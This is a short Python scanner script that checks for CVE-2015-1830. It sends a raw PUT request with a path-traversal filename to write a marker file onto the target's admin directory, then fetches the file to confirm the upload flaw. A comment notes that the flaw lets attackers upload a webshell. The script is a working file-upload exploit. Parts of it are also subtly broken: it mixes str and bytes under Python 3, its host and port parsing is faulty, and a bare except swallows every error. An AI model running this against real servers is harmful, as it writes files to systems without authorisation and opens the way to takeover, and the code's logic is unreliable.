# coding:utf-8
import socket
import time
import urllib.request as ur 
import random

#CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。
def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1

def check(url, timeout):
    try:
        if ":" not in url:
            ip = url.split("/")[2]
            if "https" in url : port = 443
            else : port = 80
        else :
            ip = url.split("/")[2].split(":")[0]
            port = url.split("/")[2].split(":")[1]
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\admin/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = url.strip("/") + '/admin/%s.txt'%(filename)
        res_html = ur.urlopen(url, timeout=timeout).read(1024)
        if 'xxscan0' in res_html:
            return u"存在任意文件上传漏洞，" + url
    except:
        pass
